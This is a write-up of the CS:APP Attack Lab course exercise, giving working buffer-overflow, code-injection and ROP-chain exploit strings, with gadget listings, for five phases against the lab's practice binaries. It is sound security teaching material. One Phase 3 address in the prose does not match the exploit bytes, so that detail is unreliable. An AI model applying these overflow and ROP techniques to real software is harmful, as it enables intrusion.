# Attack Lab

The exploitable code is in function `getbuf`:

```assembly
0x00000000004017a8 <+0>:	sub    rsp,0x28
0x00000000004017ac <+4>:	mov    rdi,rsp
0x00000000004017af <+7>:	call   0x401b60 <Gets>
0x00000000004017b4 <+12>:	mov    eax,0x1
0x00000000004017b9 <+17>:	add    rsp,0x28
0x00000000004017bd <+21>:	ret 
```

`getbuf` allocates 0x28(40) bytes in stack and use it store string from input, which called in `Gets`. However, without length check from input, we can overflow and modify return address and cause arbitrary code executed.

## Phase1

In phase 1, we need to modify return address of `getbuf` to function `touch1`.

The stack layout when calling `getbuf` (after executing `sub rsp,0x28`)is shown as below:

![phase1-1](https://raw.githubusercontent.com/ChenyuZhuWhiskey/Csapp-Lab/master/img/attack_lab/csapp_attack_phase_1_1.png)

The function `Gets` would copy every byte from input to buffer from start lower address to higher address, when constructing input string with length 48 and the last 8 byes as return address of `touch1`(little endian in my machine), after the executions of :

```assembly
0x00000000004017b9 <+17>:	add    rsp,0x28
0x00000000004017bd <+21>:	ret 
```

previous return address would be modified and jump to `touch1`.(Because `ret` would pop `rsp` to `rip` ).

We can use pwndbg check address of `touch1`:`disassemble touch1`:

```assembly
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:	sub    rsp,0x8
   0x00000000004017c4 <+4>:	mov    DWORD PTR [rip+0x203d0e],0x1        # 0x6054dc <vlevel>
   0x00000000004017ce <+14>:	mov    edi,0x4031e5
   0x00000000004017d3 <+19>:	call   0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    edi,0x1
   0x00000000004017dd <+29>:	call   0x401dad <validate>
   0x00000000004017e2 <+34>:	mov    edi,0x0
   0x00000000004017e7 <+39>:	call   0x400e40 <exit@plt>

```

So, solution to phase 1 might be as below:

```c
00000000: 6161 6161 6161 6161 6161 6161 6161 6161 
00000010: 6161 6161 6161 6161 6161 6161 6161 6161 
00000020: 6161 6161 6161 6161 c017 4000 0000 0000 
00000030: 0a 
```

## Phase 2

In phase 2, we need to call function `touch2` with 1 argument, and this argument must equal to value of cookie. First, use`disassemble touch1` find address of `touch2`:

```assembly
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:	sub    rsp,0x8
   0x00000000004017f0 <+4>:	mov    edx,edi
   0x00000000004017f2 <+6>:	mov    DWORD PTR [rip+0x203ce0],0x2        # 0x6054dc <vlevel>
   0x00000000004017fc <+16>:	cmp    edi,DWORD PTR [rip+0x203ce2]        # 0x6054e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    esi,0x403208
   0x0000000000401809 <+29>:	mov    edi,0x1
   0x000000000040180e <+34>:	mov    eax,0x0
   0x0000000000401813 <+39>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    edi,0x2
   0x000000000040181d <+49>:	call   0x401dad <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    esi,0x403230
   0x0000000000401829 <+61>:	mov    edi,0x1
   0x000000000040182e <+66>:	mov    eax,0x0
   0x0000000000401833 <+71>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    edi,0x2
   0x000000000040183d <+81>:	call   0x401e6f <fail>
   0x0000000000401842 <+86>:	mov    edi,0x0
   0x0000000000401847 <+91>:	call   0x400e40 <exit@plt>

```

We can see return address `0x4017ec`, and the argument is passed to register`edi` (line 16). To pass `cmp` at line 16, we need to set value of `edi` before calling `touch2`. Code injection is needed.

The design of attack string may look like as  follow:

- overflowed 8 bytes: address of buffer
- beginning of buffer: injection code

The injection code may looks like as follow(compile ,and use objdump):

```assembly
48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
68 ec 17 40 00       	pushq  $0x4017ec
c3                   	retq 
```

where `0x59b997fa` is cookie value.

So solution of phase 2 may look like:

```c
00000000: 48c7 c7fa 97b9 5968 ec17 4000 c361 6161 
00000010: 6161 6161 6161 6161 6161 6161 6161 6161 
00000020: 6161 6161 6161 6161 78dc 6155 0000 0000 
00000030: 0a
```

## Phase 3

In Phase 3, we need to pass string form of cookie to `touch3`. function `touch3` is shown below:

```assembly
   0x00000000004018fa <+0>:	push   rbx
   0x00000000004018fb <+1>:	mov    rbx,rdi
   0x00000000004018fe <+4>:	mov    DWORD PTR [rip+0x203bd4],0x3        # 0x6054dc <vlevel>
   0x0000000000401908 <+14>:	mov    rsi,rdi
   0x000000000040190b <+17>:	mov    edi,DWORD PTR [rip+0x203bd3]        # 0x6054e4 <cookie>
   0x0000000000401911 <+23>:	call   0x40184c <hexmatch>
   0x0000000000401916 <+28>:	test   eax,eax
   0x0000000000401918 <+30>:	je     0x40193d <touch3+67>
   0x000000000040191a <+32>:	mov    rdx,rbx
   0x000000000040191d <+35>:	mov    esi,0x403258
   0x0000000000401922 <+40>:	mov    edi,0x1
   0x0000000000401927 <+45>:	mov    eax,0x0
   0x000000000040192c <+50>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:	mov    edi,0x3
   0x0000000000401936 <+60>:	call   0x401dad <validate>
   0x000000000040193b <+65>:	jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:	mov    rdx,rbx
   0x0000000000401940 <+70>:	mov    esi,0x403280
   0x0000000000401945 <+75>:	mov    edi,0x1
   0x000000000040194a <+80>:	mov    eax,0x0
   0x000000000040194f <+85>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:	mov    edi,0x3
   0x0000000000401959 <+95>:	call   0x401e6f <fail>
   0x000000000040195e <+100>:	mov    edi,0x0
   0x0000000000401963 <+105>:	call   0x400e40 <exit@plt>
```

checking function `hexmatch` is shown as follow:

```assembly
   0x000000000040184c <+0>:	push   r12
   0x000000000040184e <+2>:	push   rbp
   0x000000000040184f <+3>:	push   rbx
   0x0000000000401850 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000401854 <+8>:	mov    r12d,edi
   0x0000000000401857 <+11>:	mov    rbp,rsi
   0x000000000040185a <+14>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000401863 <+23>:	mov    QWORD PTR [rsp+0x78],rax
   0x0000000000401868 <+28>:	xor    eax,eax
   0x000000000040186a <+30>:	call   0x400db0 <random@plt>
   0x000000000040186f <+35>:	mov    rcx,rax
   0x0000000000401872 <+38>:	movabs rdx,0xa3d70a3d70a3d70b
   0x000000000040187c <+48>:	imul   rdx
   0x000000000040187f <+51>:	add    rdx,rcx
   0x0000000000401882 <+54>:	sar    rdx,0x6
   0x0000000000401886 <+58>:	mov    rax,rcx
   0x0000000000401889 <+61>:	sar    rax,0x3f
   0x000000000040188d <+65>:	sub    rdx,rax
   0x0000000000401890 <+68>:	lea    rax,[rdx+rdx*4]
   0x0000000000401894 <+72>:	lea    rax,[rax+rax*4]
   0x0000000000401898 <+76>:	shl    rax,0x2
   0x000000000040189c <+80>:	sub    rcx,rax
   0x000000000040189f <+83>:	lea    rbx,[rsp+rcx*1]
   0x00000000004018a3 <+87>:	mov    r8d,r12d
   0x00000000004018a6 <+90>:	mov    ecx,0x403202
   0x00000000004018ab <+95>:	mov    rdx,0xffffffffffffffff
   0x00000000004018b2 <+102>:	mov    esi,0x1
   0x00000000004018b7 <+107>:	mov    rdi,rbx
   0x00000000004018ba <+110>:	mov    eax,0x0
   0x00000000004018bf <+115>:	call   0x400e70 <__sprintf_chk@plt>
   0x00000000004018c4 <+120>:	mov    edx,0x9
   0x00000000004018c9 <+125>:	mov    rsi,rbx
   0x00000000004018cc <+128>:	mov    rdi,rbp
   0x00000000004018cf <+131>:	call   0x400ca0 <strncmp@plt>
   0x00000000004018d4 <+136>:	test   eax,eax
   0x00000000004018d6 <+138>:	sete   al
   0x00000000004018d9 <+141>:	movzx  eax,al
   0x00000000004018dc <+144>:	mov    rsi,QWORD PTR [rsp+0x78]
   0x00000000004018e1 <+149>:	xor    rsi,QWORD PTR fs:0x28
   0x00000000004018ea <+158>:	je     0x4018f1 <hexmatch+165>
   0x00000000004018ec <+160>:	call   0x400ce0 <__stack_chk_fail@plt>
   0x00000000004018f1 <+165>:	sub    rsp,0xffffffffffffff80
   0x00000000004018f5 <+169>:	pop    rbx
   0x00000000004018f6 <+170>:	pop    rbp
   0x00000000004018f7 <+171>:	pop    r12
   0x00000000004018f9 <+173>:	ret
```

We can see `hexmatch` use function `sprintf()` convert cookie value (stored in `rsi`) to string form, the result is stored in a random position of a buffer length of 128 in stack, then use `strcmp()` compare with the other argument(stored in `rdi`).

In the calling of `hexmatch`, the stack layout is shown below:

![phase3-1]( https://raw.githubusercontent.com/ChenyuZhuWhiskey/Csapp-Lab/master/img/attack_lab/csapp_attack_phase_3_1.png )

In this case, we could not save cookie string in first 40 bytes of attack string, because they are in the stack of `hexmatch` and could be write up during the execution of `hexmatch`. So we need to design stack layout like this:

![phase3-2]( https://raw.githubusercontent.com/ChenyuZhuWhiskey/Csapp-Lab/master/img/attack_lab/csapp_attack_phase_3_2.png )

The injection code is shown below:

```assembly
48 c7 c7 80 dc 61 55 	mov    $0x5561dc80,%rdi
68 fa 18 40 00       	pushq  $0x4018fa
c3                   	retq 
```

where `0x5561dc80` is address of cookie string, `0x4018fa` is address of touch3.

So solution of phase 3 may look like this:

```c
00000000: 48c7 c7a8 dc61 5568 fa18 4000 c361 6161 
00000010: 6161 6161 6161 6161 6161 6161 6161 6161 
00000020: 6161 6161 6161 6161 78dc 6155 0000 0000 
00000030: 3539 6239 3937 6661
```

where string form of cookie(`59b997fa`) is following return address of `getbuf`.

## Phase 4

In phase 4 and 5, we need to do same thing as phase 2, but ASLR and non-executable stack is protecting process so that we cannot use same strategy in exploit. ROP gadget is needed.

Our goal is send cookie value to `edi`. First, we can use ROPgadget search gadget instruction `pop rax`: `ROPgadget --binary rtarget  --only 'pop|nop|ret'|grep rax`

```assembly
0x0000000000402e89 : nop dword ptr [rax] ; ret
0x00000000004019ab : pop rax ; nop ; ret
```

Available instruction address is `0x4019ab`.

Then search gadget instruction `mov rdi rax`: `ROPgadget --binary rtarget  --only 'mov|nop|ret'| grep rax | grep rdi`

```assembly
0x000000000040214d : mov qword ptr [rdi + 8], rax ; ret
0x00000000004019c5 : mov rdi, rax ; nop ; ret
0x00000000004019a2 : mov rdi, rax ; ret
```

Available instruction addresses are `0x4019c5` and `0x4019a2`.

So attack string layout may be as follow:

- gadget 1
- gadget 2
- paddings
- overflowed return address to gadget1

Solution to phase 4 may look like this:

```c
00000000: 6161 6161 6161 6161 6161 6161 6161 6161 
00000010: 6161 6161 6161 6161 6161 6161 6161 6161 
00000020: 6161 6161 6161 6161 ab19 4000 0000 0000 
00000030: fa97 b959 0000 0000 a219 4000 0000 0000  
00000040: ec17 4000 0000 0000 0a 
```

## Phase 5

In phase 5 we need do same thing as phase 3 with protections of ASLR and non-executable stack. String form of cookie need to save in higher address than overflowed return address due to same reason. To match gadget address, add instruction need to be found and position of cookie string need to be considered.

First, Search `mov rax, rsp`  gadget instruction: `ROPgadget --binary rtarget  --only 'mov|nop|ret' | grep -E "rax|rsp"`

```assembly
0x0000000000401b23 : mov byte ptr [rax + 0x605500], 0 ; ret
0x000000000040214d : mov qword ptr [rdi + 8], rax ; ret
0x0000000000401aad : mov rax, rsp ; nop ; ret
0x0000000000401a06 : mov rax, rsp ; ret
0x0000000000401a99 : mov rax, rsp ; ret 0x8dc3
0x00000000004019c5 : mov rdi, rax ; nop ; ret
0x00000000004019a2 : mov rdi, rax ; ret
0x0000000000402e89 : nop dword ptr [rax] ; ret
```

Available instruction addresses are `0x401aad` and `0x401a06`。

Next, search `add rax` gadget instruction(to make `rax` point to cookie string): `ROPgadget --binary rtarget  --only 'add|nop|ret'|grep -E "rax|eax|al"`

```assembly
0x00000000004019d8 : add al, 0x37 ; ret
0x00000000004021b9 : add byte ptr [rax + 0x29], cl ; ret
0x00000000004018aa : add byte ptr [rax - 0x39], cl ; ret 0xffff
0x0000000000402e8b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
0x0000000000402dd9 : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004021b7 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret
0x0000000000402dd8 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004017b7 : add byte ptr [rax], al ; add rsp, 0x28 ; ret
0x0000000000400c4f : add byte ptr [rax], al ; add rsp, 8 ; ret
0x0000000000401997 : add byte ptr [rax], al ; ret
0x0000000000401b25 : add byte ptr [rbp + 0x60], dl ; add byte ptr [rax], al ; ret
0x0000000000400f68 : add byte ptr [rcx], al ; ret
0x0000000000402a55 : add byte ptr ss:[rax - 0x39], cl ; ret 0xffff
0x00000000004018a7 : add dh, byte ptr [rdx] ; add byte ptr [rax - 0x39], cl ; ret 0xffff
0x0000000000401117 : add dword ptr [rax + 0x63], ecx ; ret
0x00000000004017b5 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add rsp, 0x28 ; ret
0x0000000000401995 : add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00000000004010b2 : add dword ptr [rax], eax ; add byte ptr [rcx + 0x58948c0], cl ; ret 0x2043
0x000000000040179d : add dword ptr [rbx - 0xf89f606], eax ; ret
0x0000000000400f64 : add eax, 0x20454e ; add ebx, esi ; ret
0x0000000000401b11 : add eax, 0x2045ee ; ret
0x00000000004025c7 : add eax, 0xc7480000 ; ret 0xffff
0x00000000004023bd : add ecx, dword ptr [rax - 0x7d] ; ret
0x0000000000402e89 : nop dword ptr [rax] ; ret
```

Available instruction address is `0x4019d8`.

Then search `mov rdi, rax` gadget instruction: `ROPgadget --binary rtarget  --only 'mov|nop|ret' | grep -E "rax|rdi"`

```assembly
0x0000000000401b23 : mov byte ptr [rax + 0x605500], 0 ; ret
0x000000000040214e : mov dword ptr [rdi + 8], eax ; ret
0x00000000004019e1 : mov dword ptr [rdi], 0x9090d199 ; ret
0x00000000004019c3 : mov dword ptr [rdi], 0x90c78948 ; ret
0x0000000000401aab : mov dword ptr [rdi], 0x90e08948 ; ret
0x0000000000401a5a : mov dword ptr [rdi], 0x91e08948 ; ret
0x00000000004019b5 : mov dword ptr [rdi], 0x9258c254 ; ret
0x00000000004019fc : mov dword ptr [rdi], 0xc084d181 ; ret
0x0000000000401a97 : mov dword ptr [rdi], 0xc2e08948 ; ret
0x0000000000401a6e : mov dword ptr [rdi], 0xc391d189 ; ret
0x00000000004019bc : mov dword ptr [rdi], 0xc78d4863 ; ret
0x00000000004019ae : mov dword ptr [rdi], 0xc7c78948 ; ret
0x0000000000401a0a : mov dword ptr [rdi], 0xc908c288 ; ret
0x0000000000401a7c : mov dword ptr [rdi], 0xc908ce09 ; ret
0x0000000000401a75 : mov dword ptr [rdi], 0xd238c281 ; ret
0x0000000000401a2c : mov dword ptr [rdi], 0xdb08ce81 ; ret
0x000000000040214d : mov qword ptr [rdi + 8], rax ; ret
0x0000000000401aad : mov rax, rsp ; nop ; ret
0x0000000000401a06 : mov rax, rsp ; ret
0x0000000000401a99 : mov rax, rsp ; ret 0x8dc3
0x00000000004019c5 : mov rdi, rax ; nop ; ret
0x00000000004019a2 : mov rdi, rax ; ret
0x0000000000402e89 : nop dword ptr [rax] ; ret
```

Available  instruction addresses are `0x4019c5` and `0x4019a2`。

So attack string design layout may look like this:

- gadget1
- gadget2
- gadget3
- address of `touch3`
- overflowed return address(point to gadget1)
- cookie string (`rsp + 0x37`)

Solution of phase 5 may look like below:

```c
00000000: 6161 6161 6161 6161 6161 6161 6161 6161 
00000010: 6161 6161 6161 6161 6161 6161 6161 6161 
00000020: 6161 6161 6161 6161 061a 4000 0000 0000 
00000030: d819 4000 0000 0000 a219 4000 0000 0000  
00000040: fa18 4000 0000 0000 6161 6161 6161 6161 
00000050: 6161 6161 6161 6161 6161 6161 6161 6161 
00000060: 6161 6161 6161 6135 3962 3939 3766 610a 
```



